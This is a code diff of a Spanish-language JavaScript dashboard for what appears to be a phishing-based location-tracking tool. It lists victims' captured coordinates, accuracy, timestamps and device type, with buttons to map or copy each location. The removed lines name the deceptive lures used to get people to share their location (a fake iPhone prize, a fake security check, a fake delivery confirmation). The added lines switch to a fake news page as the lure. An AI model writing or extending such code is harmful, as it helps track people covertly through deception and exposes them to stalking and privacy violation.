@@ -41,17 +41,18 @@ function initSharedDatabase() {
             
             container.innerHTML = uniqueLocations.map(location => `
                 <div class="location-item">
-                    <div class="location-header">🎯 ${location.source}</div>
+                    <div class="location-header">🎯 ${location.source || 'Fuente desconocida'}</div>
                     <div class="location-details">
-                        📍 <strong>Coordenadas:</strong> ${location.lat.toFixed(6)}, ${location.lng.toFixed(6)}<br>
+                        📍 <strong>Coordenadas:</strong> ${location.lat ? location.lat.toFixed(6) : 'N/A'}, ${location.lng ? location.lng.toFixed(6) : 'N/A'}<br>
                         🎯 <strong>Precisión:</strong> ±${Math.round(location.accuracy || 0)}m<br>
                         ⏰ <strong>Capturado:</strong> ${new Date(location.timestamp).toLocaleString()}<br>
-                        🌐 <strong>Dispositivo:</strong> ${location.userAgent.includes('Mobile') ? '📱 Móvil' : '💻 PC'}
+                        🌐 <strong>Dispositivo:</strong> ${(location.userAgent && location.userAgent.includes('Mobile')) ? '📱 Móvil' : '💻 PC'}<br>
+                        ${location.newsTitle ? `📰 <strong>Noticia:</strong> ${location.newsTitle.substring(0, 50)}...` : ''}
                         <div style="margin-top: 10px;">
-                            <button onclick="openInGoogleMaps(${location.lat}, ${location.lng})" style="background: #3498db; color: white; border: none; padding: 5px 10px; border-radius: 3px; cursor: pointer; margin-right: 5px; font-size: 0.8rem;">
+                            <button onclick="openInGoogleMaps(${location.lat || 0}, ${location.lng || 0})" style="background: #3498db; color: white; border: none; padding: 5px 10px; border-radius: 3px; cursor: pointer; margin-right: 5px; font-size: 0.8rem;">
                                 🗺️ Ver en Mapa
                             </button>
-                            <button onclick="copyToClipboard('${location.lat.toFixed(6)}, ${location.lng.toFixed(6)}')" style="background: #27ae60; color: white; border: none; padding: 5px 10px; border-radius: 3px; cursor: pointer; font-size: 0.8rem;">
+                            <button onclick="copyToClipboard('${location.lat ? location.lat.toFixed(6) : '0'}, ${location.lng ? location.lng.toFixed(6) : '0'}')" style="background: #27ae60; color: white; border: none; padding: 5px 10px; border-radius: 3px; cursor: pointer; font-size: 0.8rem;">
                                 📋 Copiar Coordenadas
                             </button>
                         </div>
@@ -101,11 +102,8 @@ function initSharedDatabase() {
         );
         
         const shortName = {
-            'Premio iPhone 15 Pro': '🎁 Premio',
-            'Resolver Acertijo': '🎮 Juego',
-            'Estudio Académico': '📊 Encuesta',
-            'Verificación de Seguridad': '⚠️ Seguridad',
-            'Confirmación de Entrega': '🍕 Delivery'
+            'Diario Regional - Noticias': '📰 Noticias',
+            'news': '📰 Noticias'
         };
         
         document.getElementById('bestStrategy').textContent = shortName[bestStrategy] || '-';
